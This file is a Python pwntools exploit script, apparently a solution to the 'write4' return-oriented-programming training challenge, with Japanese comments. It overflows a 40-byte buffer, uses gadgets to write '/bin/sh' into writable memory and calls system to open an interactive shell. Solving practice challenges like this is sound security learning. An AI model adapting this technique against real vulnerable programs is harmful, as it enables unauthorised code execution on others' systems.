from pwn import *
from subprocess import Popen, PIPE

context(arch = 'i686', os = 'linux')

# pwn
dirname = os.path.dirname(os.path.abspath(__file__))
proc = process(dirname+'/write4')

#context.terminal = ["bash", "-e"]
context.terminal = ['tmux', 'splitw', '-h']

# デバッガーにアタッチする
if len(sys.argv) > 1 and sys.argv[1] == "debug":
    gdb.attach(proc, '''
        set follow-fork-mode child
        b *0x400820
        b *0x400890
        continue
    ''')

buffSize = 40

memset = 0x601030
system_plt = 0x4005e0

#readelfより、書込み可能なメモリアドレス
bss = 0x601060
data = 0x601050

#mov [r14] r15
#pop r14;pop r15;retと組み合わせて、任意のメモリに代入できる
usefulGadgets = 0x400820
#pop r14;pop r15;ret
popGadget = 0x400890
pop_r14 = 0x400890
pop_r15 = 0x400892
pop_rdi = 0x400893

payload = b'A' * buffSize

#メモリにコマンドを書き込み
sh = b"/bin/sh"
#padding
sh += b" " * (8 - len(sh) % 8)
for i in range(0,len(sh),8):
    #分割してpopGadgetで書き込み
    payload += p64(popGadget)
    #r14(address)
    payload += p64(data + i)
    #r15(value)
    payload += sh[i:i+8]
    print(sh[i:i+8])
    #mov [r14],r15
    payload += p64(usefulGadgets)

#pop rdi;
payload += p64(pop_rdi)
payload += p64(data)

#sys_execve
#rdi const char *filename
#rsi const char *const argv[]
#rdx const char *const envp[]
payload += p64(system_plt)

for i in range(0,len(payload),8):
    n = i+7
    if(n > len(payload)):
        n = len(payload)
    print(payload[i:n])

print(len(payload))

proc.sendlineafter(">",payload)

proc.interactive()

proc.wait_for_close()
print(proc.poll())  
